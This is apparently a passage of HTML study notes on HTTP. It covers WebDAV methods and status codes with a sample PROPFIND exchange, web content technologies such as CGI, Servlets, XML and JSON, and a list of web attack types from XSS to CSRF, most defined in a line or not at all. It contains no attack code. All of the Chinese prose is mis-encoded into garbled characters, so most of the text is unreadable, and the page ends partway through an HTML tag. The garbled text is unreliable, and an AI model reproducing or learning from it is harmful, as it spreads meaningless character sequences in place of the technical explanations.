Versioningï¼ŒåŸºäºä¸‡ç»´ç½‘çš„åˆ†å¸ƒå¼åˆ›ä½œå’Œç‰ˆæœ¬æ§åˆ¶ï¼‰æ˜¯ä¸€ä¸ªå¯å¯¹ Web æœåŠ¡å™¨ä¸Šçš„å†…å®¹ç›´æ¥è¿›è¡Œæ–‡ä»¶å¤åˆ¶ã€ç¼–è¾‘ç­‰æ“ä½œçš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚å®ƒä½œä¸ºæ‰©å±• HTTP/1.1 çš„åè®®å®šä¹‰åœ¨ RFC4918ã€‚</p><p>é™¤äº†åˆ›å»ºã€åˆ é™¤æ–‡ä»¶ç­‰åŸºæœ¬åŠŸèƒ½ï¼Œå®ƒè¿˜å…·å¤‡æ–‡ä»¶åˆ›å»ºè€…ç®¡ç†ã€æ–‡ä»¶ç¼–è¾‘è¿‡ç¨‹ä¸­ç¦æ­¢å…¶ä»–ç”¨æˆ·å†…å®¹è¦†ç›–çš„åŠ é”åŠŸèƒ½ï¼Œä»¥åŠå¯¹æ–‡ä»¶å†…å®¹ä¿®æ”¹çš„ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½ã€‚</p><h4 id="æ‰©å±•-HTTP-1-1-çš„-WebDAV"><a href="#æ‰©å±•-HTTP-1-1-çš„-WebDAV" class="headerlink" title="æ‰©å±• HTTP/1.1 çš„ WebDAV"></a>æ‰©å±• <strong>HTTP/1.1</strong> çš„ <strong>WebDAV</strong></h4><p><img src="https://z3.ax1x.com/2021/04/23/cOMUA0.png" alt="cOMUA0.png"></p><p>é›†åˆï¼ˆ<strong>Collection</strong>ï¼‰ï¼šæ˜¯ä¸€ç§ç»Ÿä¸€ç®¡ç†å¤šä¸ªèµ„æºçš„æ¦‚å¿µã€‚ä»¥é›†åˆä¸ºå•ä½å¯è¿›è¡Œå„ç§æ“ä½œã€‚ä¹Ÿå¯å®ç°ç±»ä¼¼é›†åˆçš„é›†åˆè¿™æ ·çš„å åŠ ã€‚</p><p>èµ„æºï¼ˆ<strong>Resource</strong>ï¼‰ï¼šæŠŠæ–‡ä»¶æˆ–é›†åˆç§°ä¸ºèµ„æºã€‚</p><p>å±æ€§ï¼ˆ<strong>Property</strong>ï¼‰ï¼šå®šä¹‰èµ„æºçš„å±æ€§ã€‚å®šä¹‰ä»¥<strong>â€œ</strong>åç§° <strong>=</strong> å€¼<strong>â€</strong>çš„æ ¼å¼æ‰§è¡Œã€‚</p><p>é”ï¼ˆ<strong>Lock</strong>ï¼‰ï¼šæŠŠæ–‡ä»¶è®¾ç½®æˆæ— æ³•ç¼–è¾‘çŠ¶æ€ã€‚å¤šäººåŒæ—¶ç¼–è¾‘æ—¶ï¼Œå¯é˜²æ­¢åœ¨åŒä¸€æ—¶é—´è¿›è¡Œå†…å®¹å†™å…¥ã€‚</p><h4 id="WebDAV-å†…æ–°å¢çš„æ–¹æ³•åŠçŠ¶æ€ç "><a href="#WebDAV-å†…æ–°å¢çš„æ–¹æ³•åŠçŠ¶æ€ç " class="headerlink" title="WebDAV å†…æ–°å¢çš„æ–¹æ³•åŠçŠ¶æ€ç "></a><strong>WebDAV</strong> å†…æ–°å¢çš„æ–¹æ³•åŠçŠ¶æ€ç </h4><p>WebDAV ä¸ºå®ç°è¿œç¨‹æ–‡ä»¶ç®¡ç†ï¼Œå‘ HTTP/1.1 ä¸­è¿½åŠ äº†ä»¥ä¸‹è¿™äº›æ–¹æ³•ã€‚</p><p><strong>PROPFIND</strong> ï¼šè·å–å±æ€§</p><p><strong>PROPPATCH</strong> ï¼šä¿®æ”¹å±æ€§</p><p><strong>MKCOL</strong> ï¼šåˆ›å»ºé›†åˆ</p><p><strong>COPY</strong> ï¼šå¤åˆ¶èµ„æºåŠå±æ€§</p><p><strong>MOVE</strong> ï¼šç§»åŠ¨èµ„æº</p><p><strong>LOCK</strong> ï¼šèµ„æºåŠ é”</p><p><strong>UNLOCK</strong> ï¼šèµ„æºè§£é”</p><p>ä¸ºé…åˆæ‰©å±•çš„æ–¹æ³•ï¼ŒçŠ¶æ€ç ä¹Ÿéšä¹‹æ‰©å±•ã€‚</p><p><strong>102 Processing</strong> ï¼šå¯æ­£å¸¸å¤„ç†è¯·æ±‚ï¼Œä½†ç›®å‰æ˜¯å¤„ç†ä¸­çŠ¶æ€</p><p><strong>207 Multi-Status</strong> ï¼šå­˜åœ¨å¤šç§çŠ¶æ€</p><p><strong>422 Unprocessible Entity</strong> ï¼šæ ¼å¼æ­£ç¡®ï¼Œå†…å®¹æœ‰è¯¯</p><p><strong>423 Locked</strong> ï¼šèµ„æºå·²è¢«åŠ é”</p><p><strong>424 Failed Dependency</strong> ï¼šå¤„ç†ä¸æŸè¯·æ±‚å…³è”çš„è¯·æ±‚å¤±è´¥ï¼Œå› æ­¤ä¸å†ç»´æŒä¾èµ–å…³ç³»</p><p><strong>507 Isufficient Storage</strong> ï¼šä¿å­˜ç©ºé—´ä¸è¶³</p><ul><li><p><strong>WebDAV</strong> çš„è¯·æ±‚å®ä¾‹</p><p>ä¸‹é¢æ˜¯ä½¿ç”¨ PROPFIND æ–¹æ³•å¯¹ <a href="http://www.example.com/file">http://www.example.com/file </a>å‘èµ·è·å–å±æ€§çš„è¯·æ±‚ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">PROPFIND /file HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.example.com</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml; charset="utf-8" Content-Length: 219</span></span>&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:propfind xmlns:D="DAV:"&gt;&lt;D:prop xmlns:R="http://ns.example.com/boxschema/"&gt;&lt;R:bigbox/&gt;&lt;R:author/&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>WebDAV</strong> çš„å“åº”å®ä¾‹</p><p>ä¸‹é¢æ˜¯é’ˆå¯¹ä¹‹å‰çš„ PROPFIND æ–¹æ³•ï¼Œè¿”å›<a href="http://www.example.com/file">http://www.example.com/file </a>çš„å±æ€§çš„å“åº”ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">207</span> <span class="token reason-phrase string">Multi-Status</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml; charset="utf-8" Content-Length: 831</span></span>&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:multistatus xmlns:D="DAV:"&gt;&lt;D:response xmlns:R="http://ns.example.com/boxschema/"&lt;D:href&gt;http://www.example.com/file&lt;/D:href&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:bigbox&gt;&lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt;&lt;/R:bigbox&gt;&lt;R:author&gt;&lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt;&lt;/R:author&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt;&lt;/D:propstat&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt;&lt;D:responsedescription&gt; The user does not have acc&lt;/D:responsedescription&gt;&lt;/D:propstat&gt;&lt;/D:response&gt;&lt;D:responsedescription&gt; There has been an access viola&lt;/D:responsedescription&gt;&lt;/D:multistatus&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="æ„å»º-Web-å†…å®¹çš„æŠ€æœ¯"><a href="#æ„å»º-Web-å†…å®¹çš„æŠ€æœ¯" class="headerlink" title="æ„å»º Web å†…å®¹çš„æŠ€æœ¯"></a>æ„å»º <strong>Web</strong> å†…å®¹çš„æŠ€æœ¯</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><h5 id="Web-é¡µé¢å‡ ä¹å…¨ç”±-HTML-æ„å»º"><a href="#Web-é¡µé¢å‡ ä¹å…¨ç”±-HTML-æ„å»º" class="headerlink" title="Web é¡µé¢å‡ ä¹å…¨ç”± HTML æ„å»º"></a><strong>Web</strong> é¡µé¢å‡ ä¹å…¨ç”± <strong>HTML</strong> æ„å»º</h5><h5 id="HTMLç‰ˆæœ¬"><a href="#HTMLç‰ˆæœ¬" class="headerlink" title="HTMLç‰ˆæœ¬"></a>HTMLç‰ˆæœ¬</h5><h5 id="è®¾è®¡åº”ç”¨-CSS"><a href="#è®¾è®¡åº”ç”¨-CSS" class="headerlink" title="è®¾è®¡åº”ç”¨ CSS"></a>è®¾è®¡åº”ç”¨ <strong>CSS</strong></h5><h4 id="åŠ¨æ€HTML"><a href="#åŠ¨æ€HTML" class="headerlink" title="åŠ¨æ€HTML"></a>åŠ¨æ€HTML</h4><p>ä½¿ç”¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€å°†é™æ€çš„ HTML å†…å®¹å˜æˆåŠ¨æ€çš„æŠ€æœ¯çš„æ€»ç§°ã€‚</p><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>DOM æ˜¯ç”¨ä»¥æ“ä½œ HTML æ–‡æ¡£å’Œ XML æ–‡æ¡£çš„ APIï¼ˆApplication Programming Interfaceï¼Œåº”ç”¨ç¼–ç¨‹æ¥å£ï¼‰ã€‚</p><p>Webåº”ç”¨</p><h4 id="é€šè¿‡-Web-æä¾›åŠŸèƒ½çš„-Web-åº”ç”¨"><a href="#é€šè¿‡-Web-æä¾›åŠŸèƒ½çš„-Web-åº”ç”¨" class="headerlink" title="é€šè¿‡ Web æä¾›åŠŸèƒ½çš„ Web åº”ç”¨"></a>é€šè¿‡ <strong>Web</strong> æä¾›åŠŸèƒ½çš„ <strong>Web</strong> åº”ç”¨</h4><p>ç”±ç¨‹åºåˆ›å»ºçš„å†…å®¹ç§°ä¸ºåŠ¨æ€å†…å®¹ï¼Œè€Œäº‹å…ˆå‡†å¤‡å¥½çš„å†…å®¹ç§°ä¸ºé™æ€å†…å®¹ã€‚</p><h4 id="ä¸-Web-æœåŠ¡å™¨åŠç¨‹åºåä½œçš„-CGI"><a href="#ä¸-Web-æœåŠ¡å™¨åŠç¨‹åºåä½œçš„-CGI" class="headerlink" title="ä¸ Web æœåŠ¡å™¨åŠç¨‹åºåä½œçš„ CGI"></a>ä¸ <strong>Web</strong> æœåŠ¡å™¨åŠç¨‹åºåä½œçš„ <strong>CGI</strong></h4><p>CGIï¼ˆCommon Gateway Interfaceï¼Œé€šç”¨ç½‘å…³æ¥å£ï¼‰æ˜¯æŒ‡ Web æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚åè½¬å‘ç»™ç¨‹åºçš„ä¸€ç»„æœºåˆ¶ã€‚åœ¨ CGI çš„ä½œç”¨ä¸‹ï¼Œç¨‹åºä¼šå¯¹è¯·æ±‚å†…å®¹åšå‡ºç›¸åº”çš„åŠ¨ä½œï¼Œæ¯”å¦‚åˆ›å»º HTML ç­‰åŠ¨æ€å†…å®¹ã€‚</p><p>ä½¿ç”¨ CGI çš„ç¨‹åºå«åš CGI ç¨‹åºï¼Œé€šå¸¸æ˜¯ç”¨ Perlã€PHPã€Ruby å’Œ C ç­‰ç¼–ç¨‹è¯­è¨€ç¼–å†™è€Œæˆã€‚</p><h4 id="å› -Java-è€Œæ™®åŠçš„-Servlet"><a href="#å› -Java-è€Œæ™®åŠçš„-Servlet" class="headerlink" title="å›  Java è€Œæ™®åŠçš„ Servlet"></a>å›  <strong>Java</strong> è€Œæ™®åŠçš„ <strong>Servlet</strong></h4><p>Servlet æ˜¯ä¸€ç§èƒ½åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºåŠ¨æ€å†…å®¹çš„ç¨‹åºã€‚Servlet æ˜¯ç”¨ Java è¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå±äºé¢å‘ä¼ä¸šçº§ Javaï¼ˆJavaEEï¼ŒJava Enterprise Editionï¼‰çš„ä¸€éƒ¨åˆ†ã€‚è´Ÿè½½å°ã€‚</p><h3 id="æ•°æ®å‘å¸ƒçš„æ ¼å¼åŠè¯­è¨€"><a href="#æ•°æ®å‘å¸ƒçš„æ ¼å¼åŠè¯­è¨€" class="headerlink" title="æ•°æ®å‘å¸ƒçš„æ ¼å¼åŠè¯­è¨€"></a>æ•°æ®å‘å¸ƒçš„æ ¼å¼åŠè¯­è¨€</h3><h4 id="å¯æ‰©å±•æ ‡è®°è¯­è¨€"><a href="#å¯æ‰©å±•æ ‡è®°è¯­è¨€" class="headerlink" title="å¯æ‰©å±•æ ‡è®°è¯­è¨€"></a>å¯æ‰©å±•æ ‡è®°è¯­è¨€</h4><p>XMLï¼ˆeXtensible Markup Languageï¼Œå¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼‰æ˜¯ä¸€ç§å¯æŒ‰åº”ç”¨ç›®æ ‡è¿›è¡Œæ‰©å±•çš„é€šç”¨æ ‡è®°è¯­è¨€ã€‚æ—¨åœ¨é€šè¿‡ä½¿ç”¨ XMLï¼Œä½¿äº’è”ç½‘æ•°æ®å…±äº«å˜å¾—æ›´å®¹æ˜“ã€‚</p><p>XML å’Œ HTML éƒ½æ˜¯ä»æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ SGMLï¼ˆStandard Generalized Markup Languageï¼‰ç®€åŒ–è€Œæˆã€‚ä¸ HTML ç›¸æ¯”ï¼Œå®ƒå¯¹æ•°æ®çš„è®°å½•æ–¹å¼åšäº†ç‰¹æ®Šå¤„ç†ã€‚</p><h4 id="å‘å¸ƒæ›´æ–°ä¿¡æ¯çš„-RSS-Atom"><a href="#å‘å¸ƒæ›´æ–°ä¿¡æ¯çš„-RSS-Atom" class="headerlink" title="å‘å¸ƒæ›´æ–°ä¿¡æ¯çš„ RSS/Atom"></a>å‘å¸ƒæ›´æ–°ä¿¡æ¯çš„ <strong>RSS/Atom</strong></h4><p>RSSï¼ˆç®€æ˜“ä¿¡æ¯èšåˆï¼Œä¹Ÿå«èšåˆå†…å®¹ï¼‰å’Œ Atom éƒ½æ˜¯å‘å¸ƒæ–°é—»æˆ–åšå®¢æ—¥å¿—ç­‰æ›´æ–°ä¿¡æ¯æ–‡æ¡£çš„æ ¼å¼çš„æ€»ç§°ã€‚ä¸¤è€…éƒ½ç”¨åˆ°äº† XMLã€‚</p><h4 id="JavaScript-è¡ç”Ÿçš„è½»é‡çº§æ˜“ç”¨-JSON"><a href="#JavaScript-è¡ç”Ÿçš„è½»é‡çº§æ˜“ç”¨-JSON" class="headerlink" title="JavaScript è¡ç”Ÿçš„è½»é‡çº§æ˜“ç”¨ JSON"></a><strong>JavaScript</strong> è¡ç”Ÿçš„è½»é‡çº§æ˜“ç”¨ <strong>JSON</strong></h4><p>JSONï¼ˆJavaScript Object Notationï¼‰æ˜¯ä¸€ç§ä»¥JavaScriptï¼ˆECMAScriptï¼‰çš„å¯¹è±¡è¡¨ç¤ºæ³•ä¸ºåŸºç¡€çš„è½»é‡çº§æ•°æ®æ ‡è®°è¯­è¨€ã€‚</p><h2 id="Web-çš„æ”»å‡»æŠ€æœ¯"><a href="#Web-çš„æ”»å‡»æŠ€æœ¯" class="headerlink" title="Web çš„æ”»å‡»æŠ€æœ¯"></a><strong>Web</strong> çš„æ”»å‡»æŠ€æœ¯</h2><h3 id="é’ˆå¯¹-Web-çš„æ”»å‡»æŠ€æœ¯"><a href="#é’ˆå¯¹-Web-çš„æ”»å‡»æŠ€æœ¯" class="headerlink" title="é’ˆå¯¹ Web çš„æ”»å‡»æŠ€æœ¯"></a>é’ˆå¯¹ <strong>Web</strong> çš„æ”»å‡»æŠ€æœ¯</h3><h4 id="HTTP-ä¸å…·å¤‡å¿…è¦çš„å®‰å…¨åŠŸèƒ½"><a href="#HTTP-ä¸å…·å¤‡å¿…è¦çš„å®‰å…¨åŠŸèƒ½" class="headerlink" title="HTTP ä¸å…·å¤‡å¿…è¦çš„å®‰å…¨åŠŸèƒ½"></a><strong>HTTP</strong> ä¸å…·å¤‡å¿…è¦çš„å®‰å…¨åŠŸèƒ½</h4><h4 id="åœ¨å®¢æˆ·ç«¯å³å¯ç¯¡æ”¹è¯·æ±‚"><a href="#åœ¨å®¢æˆ·ç«¯å³å¯ç¯¡æ”¹è¯·æ±‚" class="headerlink" title="åœ¨å®¢æˆ·ç«¯å³å¯ç¯¡æ”¹è¯·æ±‚"></a>åœ¨å®¢æˆ·ç«¯å³å¯ç¯¡æ”¹è¯·æ±‚</h4><h4 id="é’ˆå¯¹-Web-åº”ç”¨çš„æ”»å‡»æ¨¡å¼"><a href="#é’ˆå¯¹-Web-åº”ç”¨çš„æ”»å‡»æ¨¡å¼" class="headerlink" title="é’ˆå¯¹ Web åº”ç”¨çš„æ”»å‡»æ¨¡å¼"></a>é’ˆå¯¹ <strong>Web</strong> åº”ç”¨çš„æ”»å‡»æ¨¡å¼</h4><ul><li>ä¸»åŠ¨æ”»å‡»</li><li>è¢«åŠ¨æ”»å‡»</li><li>ä»¥æœåŠ¡å™¨ä¸ºç›®æ ‡çš„ä¸»åŠ¨æ”»å‡»</li><li>ä»¥æœåŠ¡å™¨ä¸ºç›®æ ‡çš„è¢«åŠ¨æ”»</li></ul><h3 id="å› è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨å¼•å‘çš„å®‰å…¨æ¼æ´"><a href="#å› è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨å¼•å‘çš„å®‰å…¨æ¼æ´" class="headerlink" title="å› è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨å¼•å‘çš„å®‰å…¨æ¼æ´"></a>å› è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨å¼•å‘çš„å®‰å…¨æ¼æ´</h3><ul><li>å®¢æˆ·ç«¯çš„éªŒè¯</li><li><strong>Web</strong> åº”ç”¨ç«¯ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰çš„éªŒè¯<ul><li>è¾“å…¥å€¼éªŒè¯</li><li>è¾“å‡ºå€¼è½¬ä¹‰</li></ul></li></ul><h4 id="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site-Scriptingï¼ŒXSSï¼‰"><a href="#è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site-Scriptingï¼ŒXSSï¼‰" class="headerlink" title="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰"></a>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰</h4><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯æŒ‡é€šè¿‡å­˜åœ¨å®‰å…¨æ¼æ´çš„Web ç½‘ç«™æ³¨å†Œç”¨æˆ·çš„æµè§ˆå™¨å†…è¿è¡Œéæ³•çš„ HTML æ ‡ç­¾æˆ– JavaScript è¿›è¡Œçš„ä¸€ç§æ”»å‡»ã€‚</p><h4 id="SQL-æ³¨å…¥ï¼ˆSQL-Injectionï¼‰"><a href="#SQL-æ³¨å…¥ï¼ˆSQL-Injectionï¼‰" class="headerlink" title="SQL æ³¨å…¥ï¼ˆSQL Injectionï¼‰"></a>SQL æ³¨å…¥ï¼ˆSQL Injectionï¼‰</h4><h4 id="OS-å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼ˆOS-Command-Injectionï¼‰"><a href="#OS-å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼ˆOS-Command-Injectionï¼‰" class="headerlink" title="OS å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼ˆOS Command Injectionï¼‰"></a>OS å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼ˆOS Command Injectionï¼‰</h4><h4 id="HTTP-é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP-Header-Injectionï¼‰"><a href="#HTTP-é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP-Header-Injectionï¼‰" class="headerlink" title="HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP Header Injectionï¼‰"></a>HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP Header Injectionï¼‰</h4><h4 id="é‚®ä»¶é¦–éƒ¨æ³¨å…¥ï¼ˆMail-Header-Injectionï¼‰"><a href="#é‚®ä»¶é¦–éƒ¨æ³¨å…¥ï¼ˆMail-Header-Injectionï¼‰" class="headerlink" title="é‚®ä»¶é¦–éƒ¨æ³¨å…¥ï¼ˆMail Header Injectionï¼‰"></a>é‚®ä»¶é¦–éƒ¨æ³¨å…¥ï¼ˆMail Header Injectionï¼‰</h4><h4 id="ç›®å½•éå†ï¼ˆDirectory-Traversalï¼‰æ”»å‡»"><a href="#ç›®å½•éå†ï¼ˆDirectory-Traversalï¼‰æ”»å‡»" class="headerlink" title="ç›®å½•éå†ï¼ˆDirectory Traversalï¼‰æ”»å‡»"></a>ç›®å½•éå†ï¼ˆDirectory Traversalï¼‰æ”»å‡»</h4><h4 id="è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRemote-File-Inclusionï¼‰"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRemote-File-Inclusionï¼‰" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRemote File Inclusionï¼‰"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRemote File Inclusionï¼‰</h4><h3 id="å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼æ´"><a href="#å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼æ´" class="headerlink" title="å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼æ´"></a>å› è®¾ç½®æˆ–è®¾è®¡ä¸Šçš„ç¼ºé™·å¼•å‘çš„å®‰å…¨æ¼æ´</h3><h4 id="å¼ºåˆ¶æµè§ˆï¼ˆForced-Browsingï¼‰"><a href="#å¼ºåˆ¶æµè§ˆï¼ˆForced-Browsingï¼‰" class="headerlink" title="å¼ºåˆ¶æµè§ˆï¼ˆForced Browsingï¼‰"></a>å¼ºåˆ¶æµè§ˆï¼ˆForced Browsingï¼‰</h4><p>å¼ºåˆ¶æµè§ˆï¼ˆForced Browsingï¼‰å®‰å…¨æ¼æ´æ˜¯æŒ‡ï¼Œä»å®‰ç½®åœ¨ Web æœåŠ¡å™¨çš„å…¬å¼€ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­ï¼Œæµè§ˆé‚£äº›åŸæœ¬éè‡ªæ„¿å…¬å¼€çš„æ–‡ä»¶ã€‚</p><h4 id="ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError-Handling-Vulnerabilityï¼‰"><a href="#ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError-Handling-Vulnerabilityï¼‰" class="headerlink" title="ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError Handling Vulnerabilityï¼‰"></a>ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError Handling Vulnerabilityï¼‰</h4><p>ä¸æ­£ç¡®çš„é”™è¯¯æ¶ˆæ¯å¤„ç†ï¼ˆError Handling Vulnerabilityï¼‰çš„å®‰å…¨æ¼æ´æ˜¯æŒ‡ï¼ŒWeb åº”ç”¨çš„é”™è¯¯ä¿¡æ¯å†…åŒ…å«å¯¹æ”»å‡»è€…æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><h4 id="å¼€æ”¾é‡å®šå‘ï¼ˆOpen-Redirectï¼‰"><a href="#å¼€æ”¾é‡å®šå‘ï¼ˆOpen-Redirectï¼‰" class="headerlink" title="å¼€æ”¾é‡å®šå‘ï¼ˆOpen Redirectï¼‰"></a>å¼€æ”¾é‡å®šå‘ï¼ˆOpen Redirectï¼‰</h4><p>å¼€æ”¾é‡å®šå‘ï¼ˆOpen Redirectï¼‰æ˜¯ä¸€ç§å¯¹æŒ‡å®šçš„ä»»æ„ URL ä½œé‡å®šå‘è·³è½¬çš„åŠŸèƒ½ã€‚è€Œäºæ­¤åŠŸèƒ½ç›¸å…³è”çš„å®‰å…¨æ¼æ´æ˜¯æŒ‡ï¼Œå‡å¦‚æŒ‡å®šçš„é‡å®šå‘ URL åˆ°æŸä¸ªå…·æœ‰æ¶æ„çš„ Web ç½‘ç«™ï¼Œé‚£ä¹ˆç”¨æˆ·å°±ä¼šè¢«è¯±å¯¼è‡³é‚£ä¸ª Web ç½‘ç«™ã€‚</p><h3 id="å› ä¼šè¯ç®¡ç†ç–å¿½å¼•å‘çš„å®‰å…¨æ¼æ´"><a href="#å› ä¼šè¯ç®¡ç†ç–å¿½å¼•å‘çš„å®‰å…¨æ¼æ´" class="headerlink" title="å› ä¼šè¯ç®¡ç†ç–å¿½å¼•å‘çš„å®‰å…¨æ¼æ´"></a>å› ä¼šè¯ç®¡ç†ç–å¿½å¼•å‘çš„å®‰å…¨æ¼æ´</h3><h4 id="ä¼šè¯åŠ«æŒï¼ˆSession-Hijackï¼‰"><a href="#ä¼šè¯åŠ«æŒï¼ˆSession-Hijackï¼‰" class="headerlink" title="ä¼šè¯åŠ«æŒï¼ˆSession Hijackï¼‰"></a>ä¼šè¯åŠ«æŒï¼ˆSession Hijackï¼‰</h4><p>ä¼šè¯åŠ«æŒï¼ˆSession Hijackï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æŸç§æ‰‹æ®µæ‹¿åˆ°äº†ç”¨æˆ·çš„ä¼šè¯ IDï¼Œå¹¶éæ³•ä½¿ç”¨æ­¤ä¼šè¯ ID ä¼ªè£…æˆç”¨æˆ·ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p><h4 id="ä¼šè¯å›ºå®šæ”»å‡»"><a href="#ä¼šè¯å›ºå®šæ”»å‡»" class="headerlink" title="ä¼šè¯å›ºå®šæ”»å‡»"></a>ä¼šè¯å›ºå®šæ”»å‡»</h4><p>å¯¹ä»¥çªƒå–ç›®æ ‡ä¼šè¯ ID ä¸ºä¸»åŠ¨æ”»å‡»æ‰‹æ®µçš„ä¼šè¯åŠ«æŒè€Œè¨€ï¼Œä¼šè¯å›ºå®šæ”»å‡»ï¼ˆSession Fixationï¼‰æ”»å‡»ä¼šå¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨æ”»å‡»è€…æŒ‡å®šçš„ä¼šè¯ IDï¼Œå±äºè¢«åŠ¨æ”»å‡»ã€‚</p><h4 id="è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site-Request-Forgeriesï¼ŒCSRFï¼‰"><a href="#è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site-Request-Forgeriesï¼ŒCSRFï¼‰" class="headerlink" title="è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeriesï¼ŒCSRFï¼‰"></a>è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeriesï¼ŒCSRFï¼‰</h4><p>è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeriesï¼ŒCSRFï¼‰æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡è®¾ç½®å¥½çš„é™·é˜±ï¼Œå¼ºåˆ¶å¯¹å·²å®Œæˆè®¤è¯çš„ç”¨æˆ·è¿›è¡Œéé¢„æœŸçš„ä¸ªäººä¿¡æ¯æˆ–è®¾å®šä¿¡æ¯ç­‰æŸäº›çŠ¶æ€æ›´æ–°ï¼Œå±äºè¢«åŠ¨æ”»å‡»ã€‚</p><h3 id="å…¶ä»–å®‰å…¨æ¼æ´"><a href="#å…¶ä»–å®‰å…¨æ¼æ´" class="headerlink" title="å…¶ä»–å®‰å…¨æ¼æ´"></a>å…¶ä»–å®‰å…¨æ¼æ´</h3><h4 id="å¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword-Crackingï¼‰"><a href="#å¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword-Crackingï¼‰" class="headerlink" title="å¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword Crackingï¼‰"></a>å¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword Crackingï¼‰</h4><p>å¯†ç ç ´è§£æ”»å‡»ï¼ˆPassword Crackingï¼‰å³ç®—å‡ºå¯†ç ï¼Œçªç ´è®¤è¯ã€‚</p><h4 id="ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰"><a 